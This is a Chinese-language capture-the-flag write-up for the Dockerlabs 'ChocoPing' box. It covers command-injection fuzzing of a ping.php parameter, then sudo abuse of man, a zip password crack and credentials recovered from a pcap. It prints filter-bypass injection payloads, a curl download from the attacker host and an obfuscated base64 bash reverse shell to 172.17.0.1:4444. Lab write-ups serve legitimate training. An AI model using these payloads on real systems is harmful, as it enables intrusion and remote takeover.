---
title: "Dockerlabs-ChocoPing"
date: 2025-04-15
categories: 
  - "dockerlabs"
tags: 
  - "dockerlabs"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Medium |

## Nmap

```
[root@kali] /home/kali/Chocoping  
❯ nmap 172.17.0.2 -sV -A -p- 

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Index of /
|_http-server-header: Apache/2.4.62 (Debian)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 1.0K  2025-04-05 11:13  ping.php
```

## Own www-data

注意到可以传入**ip**参数执行**ping**命令

![](./images/image-77.png)

下面我会用两种扫描工具来进行对比

这里使用**wfuzz**来进行扫描

```
[root@kali] /home/kali/Chocoping  
❯ wfuzz -c --hw 3 -z file,../Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt "http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ"

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ
Total requests: 174

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000070:   200        0 L      1 W        22 Ch       "c\\a\\t+/et\\c/pas\\swd"                                                                  
000000165:   200        0 L      1 W        22 Ch       "cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`"                             
000000142:   200        1 L      12 W       126 Ch      "\u\n\a\m\e \-\a"                                                                          

Total time: 0.078702
Processed Requests: 174
Filtered Requests: 171
Requests/sec.: 2210.858
```

可以看到其中**uname**的执行结果

![](./images/image-78.png)

接下来使用**ffuf**，得到同样的结果

```
[root@kali] /home/kali/Chocoping  
❯ ffuf -u 'http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ' -w ../Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt -enc 'FUZZ:urlencode' -fs 21

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ
 :: Wordlist         : FUZZ: /home/kali/Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 21
________________________________________________

c%5C%5Ca%5C%5Ct%2B%2Fet%5C%5Cc%2Fpas%5C%5Cswd [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 4ms]
%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca [Status: 200, Size: 126, Words: 11, Lines: 2, Duration: 4ms]
cat+%60echo+-e+%22%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22%60 [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 3ms]
:: Progress: [174/174] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

两者的区别就在于，**wfuzz**会自动进行**urlencode**，而**ffuf**需要指定编码

就这里而言，命令的执行方式类似于把所有字符前面加上一个斜杠

```
\u\n\a\m\e \-\a
```

经过测试，只有第一个单词需要这样做

```
http://172.17.0.2/ping.php?ip=127.0.0.1;\c\u\r\l%20172.17.0.1/shell%20-O%20/tmp/shell
```

我这里使用的是**penelope**的**payload**

```
http://172.17.0.2/ping.php?ip=127.0.0.1;\p\r\i\n\t\f%20%20KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0ICAwPiYxKSAm|base64%20-d%20|%20bash
```

需要注意的是如果**URL**中存在**base64**编码的话，要尽量避免加号和一些特殊符号，因为会被转义

比如这里我就修改了一下他的**payload**，通过调整其中的空格间距来消除加号和等号

![](./images/image-79.png)

![](./images/image-80.png)

## Own balutin

```
www-data@df356a56c13a:/var/www$ sudo -l
Matching Defaults entries for www-data on df356a56c13a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on df356a56c13a:
    (balutin) NOPASSWD: /usr/bin/man
```

- [man | GTFOBins](https://gtfobins.github.io/gtfobins/man/#sudo)

![](./images/image-81.png)

## Root

尝试爆破这个压缩包的密码

```
[root@kali] /home/kali/Chocoping  
❯ zip2john secretito.zip >> zip.hash  

[root@kali] /home/kali/Chocoping  
❯ john zip.hash /usr/share/wordlists/rockyou.txt
```

![](./images/image-82.png)

得到密码是**chocolate**

使用**wireshark**一下就能看到密码了

![](./images/image-83.png)

```
[root@kali] /home/kali/Chocoping  
❯ strings traffic.pcap 
POST /login HTTP/1.1
Host: ejemplo.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
username=root&password=secretitosecretazo!
GET /private HTTP/1.1
Authorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE=
Host: ejemplo.com
```

![](./images/image-84.png)

## Summary

`User`：主要是使用**ffuf**的时候注意一下**url**编码

`Root`：**zip**压缩包爆破
